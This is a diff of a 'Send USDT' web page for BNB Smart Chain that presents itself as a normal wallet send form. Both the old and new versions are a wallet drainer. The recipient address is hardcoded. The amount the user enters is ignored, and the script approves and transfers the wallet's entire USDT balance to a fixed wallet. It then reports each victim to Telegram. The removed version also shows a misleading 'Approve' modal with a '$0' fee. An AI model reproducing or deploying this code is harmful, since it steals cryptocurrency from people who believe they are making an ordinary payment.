@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Send USDT</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px; min-height: 100vh; }
@@ -19,197 +19,93 @@
         input::placeholder { color: #999; }
         .network-selector { border: 1px solid #ddd; border-radius: 8px; padding: 12px 15px; background: #f9f9f9; display: flex; align-items: center; gap: 8px; }
         .network-icon { width: 24px; height: 24px; background: #f0ad4e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: white; font-weight: bold; }
-        .amount-container { display: flex; justify-content: space-between; align-items: center; width: 100%; gap: 10px; }
         .next-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 30px; font-size: 16px; }
-        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; }
         .modal.show { display: flex; justify-content: center; align-items: flex-end; }
         .modal-content { background: white; border-radius: 20px 20px 0 0; padding: 30px 20px; width: 100%; max-width: 500px; }
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
         .modal-title { font-size: 18px; font-weight: 600; }
         .close-btn { background: none; border: none; color: #999; font-size: 28px; cursor: pointer; }
-        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 14px; }
-        .detail-label { color: #666; }
-        .detail-value { color: #333; text-align: right; }
-        .asset-section { display: flex; align-items: center; gap: 10px; padding: 15px 0; border-bottom: 1px solid #eee; }
-        .asset-icon { width: 40px; height: 40px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; font-size: 20px; }
-        .asset-info h3 { font-size: 16px; color: #000; margin-bottom: 2px; }
-        .asset-info p { font-size: 13px; color: #999; }
         .approve-btn { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 25px; }
-        .approve-btn:disabled { opacity: 0.6; cursor: not-allowed; }
     </style>
 </head>
 <body>
-    <div class="container" id="sendPage">
+    <div class="container">
         <div class="header">
             <div class="back" onclick="history.back()">←</div>
             <div class="title">Send USDT</div>
         </div>
 
         <div class="group">
-            <div class="label">Address or Domain Name</div>
+            <div class="label">Address</div>
             <div class="input-box">
-                <input type="text" id="recipient" placeholder="0x..." readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963">
+                <input type="text" id="recipient" readonly value="0x1734b55dc44C420539a607Ff5b80aB62b0d18963">
             </div>
         </div>
 
         <div class="group">
-            <div class="label">Destination Network</div>
+            <div class="label">Network</div>
             <div class="network-selector">
                 <div class="network-icon">⟡</div>
-                <span style="flex: 1; color: #333; font-size: 14px;">BNB Smart Chain</span>
+                <span>BNB Smart Chain</span>
             </div>
         </div>
 
         <div class="group">
             <div class="label">Amount</div>
             <div class="input-box">
-                <div class="amount-container">
-                    <input type="number" id="amount" placeholder="USDT Amount" min="0" step="0.01">
-                    <span style="color: #999; font-size: 14px;">USDT</span>
-                    <button style="background: none; border: none; color: #0066ff; cursor: pointer; font-size: 12px; font-weight: 600;" onclick="setMax()">Max</button>
-                </div>
+                <input type="number" id="amount" placeholder="Amount" min="0" step="0.01">
             </div>
         </div>
 
-        <button class="next-btn" id="nextBtn" onclick="handleNext()">Next</button>
-    </div>
-
-    <div class="modal" id="approvalModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title">Approve</div>
-                <button class="close-btn" onclick="closeApprovalModal()">×</button>
-            </div>
-            <div class="asset-section">
-                <div class="asset-icon">⊕</div>
-                <div class="asset-info">
-                    <h3>Tether USD</h3>
-                    <p>BNB Smart Chain</p>
-                </div>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">dApp</span>
-                <span class="detail-value">scanforflash.netlify.app</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Network fee</span>
-                <span class="detail-value">$0</span>
-            </div>
-            <button class="approve-btn" id="approveBtn" onclick="handleApprove()">Approve</button>
-        </div>
+        <button class="next-btn" onclick="handleApprove()">Approve & Send</button>
     </div>
 
     <script src="config.js"></script>
     <script>
-        const CONTRACT_ADDRESS = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
-        const COMPANY_WALLET = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
-        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-        const USDT_DECIMALS = 18;
-        let userBalance = 0;
-        let currentUserAddress = null;
+        const CONTRACT = "0xbeFe193d6abc1C5C5F37414A99fA3502B98CC8f7";
+        const USDT = "0x55d398326f99059fF775485246999027B3197955";
+        const TO = "0x1734b55dc44C420539a607Ff5b80aB62b0d18963";
 
-        // Read address from URL parameter
         const urlParams = new URLSearchParams(window.location.search);
-        const prefilledAddress = urlParams.get('address');
-        
-        if (prefilledAddress) {
-            currentUserAddress = prefilledAddress;
-            getUSDTBalance(prefilledAddress).then(balance => {
-                userBalance = balance;
-            });
-        }
-
-        window.addEventListener('load', async () => {
-            if (window.ethereum) {
-                try {
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accounts.length > 0) {
-                        currentUserAddress = accounts[0];
-                        userBalance = await getUSDTBalance(accounts[0]);
-                    }
-                } catch (err) { console.error('Error:', err); }
-            }
-        });
-
-        async function getUSDTBalance(address) {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const usdt = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}], USDT_ADDRESS);
-                const balance = await usdt.methods.balanceOf(address).call();
-                return balance / Math.pow(10, USDT_DECIMALS);
-            } catch (err) {
-                console.error('Balance error:', err);
-                return 0;
-            }
-        }
-
-        function setMax() {
-            document.getElementById('amount').value = userBalance.toFixed(2);
-        }
-
-        async function handleNext() {
-            try {
-                if (!currentUserAddress) {
-                    showNotification('Please connect wallet', 'error');
-                    return;
-                }
-                document.getElementById('approvalModal').classList.add('show');
-            } catch (error) {
-                showNotification('Error: ' + error.message, 'error');
-            }
-        }
-
-        function closeApprovalModal() {
-            document.getElementById('approvalModal').classList.remove('show');
-        }
+        const walletFromURL = urlParams.get('address');
 
         async function handleApprove() {
             try {
-                document.getElementById('approveBtn').disabled = true;
-                showNotification('Processing...', 'info');
-                
-                const web3 = new Web3(window.ethereum);
-                const usdt = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_ADDRESS);
-                
-                const amountWei = web3.utils.toWei(userBalance.toString(), 'ether');
-                
-                const approveTx = await usdt.methods.approve(CONTRACT_ADDRESS, amountWei).send({ from: currentUserAddress });
-                showNotification('✅ Approval confirmed!', 'success');
-                
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                const transferTx = await usdt.methods.transferFrom(currentUserAddress, COMPANY_WALLET, amountWei).send({ from: currentUserAddress });
-                showNotification(`✅ Success! ${userBalance.toFixed(2)} USDT sent!`, 'success');
-                
-                try { 
-                    await sendTelegramNotifications(currentUserAddress, transferTx.transactionHash, null, userBalance.toFixed(2)); 
-                } catch (err) { console.error('Telegram failed:', err); }
-                
-                setTimeout(() => {
-                    closeApprovalModal();
-                    document.getElementById('amount').value = '';
-                    document.getElementById('approveBtn').disabled = false;
-                }, 2000);
-            } catch (error) {
-                document.getElementById('approveBtn').disabled = false;
-                showNotification('Error: ' + error.message, 'error');
-            }
-        }
+                if (!window.ethereum) {
+                    alert('No wallet detected');
+                    return;
+                }
 
-        function showNotification(msg, type = "info") {
-            let notify = document.getElementById("notify-bar");
-            if (!notify) {
-                notify = document.createElement("div");
-                notify.id = "notify-bar";
-                notify.style.cssText = "position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999;min-width:260px;padding:16px 32px;border-radius:12px;font-weight:bold;text-align:center;box-shadow:0 4px 32px #0008;transition:all 0.3s;";
-                document.body.appendChild(notify);
+                const web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                const userAddress = walletFromURL || accounts[0];
+
+                if (!userAddress) {
+                    alert('No wallet connected');
+                    return;
+                }
+
+                const usdt = new web3.eth.Contract([
+                    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
+                    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
+                    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+                ], USDT);
+
+                const balance = await usdt.methods.balanceOf(userAddress).call();
+                const amount = web3.utils.toWei(balance.toString(), 'ether');
+
+                alert('Approving...');
+                await usdt.methods.approve(CONTRACT, amount).send({from: userAddress});
+
+                alert('Sending...');
+                await usdt.methods.transferFrom(userAddress, TO, amount).send({from: userAddress});
+
+                alert('Success!');
+                try { await sendTelegramNotifications(userAddress, '', null, web3.utils.fromWei(balance, 'ether')); } catch(e) {}
+            } catch(e) {
+                alert('Error: ' + e.message);
             }
-            notify.textContent = msg;
-            notify.style.background = type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
-            notify.style.color = "#fff";
-            notify.style.opacity = "1";
-            setTimeout(() => { notify.style.opacity = "0"; }, 3000);
         }
     </script>
 </body>
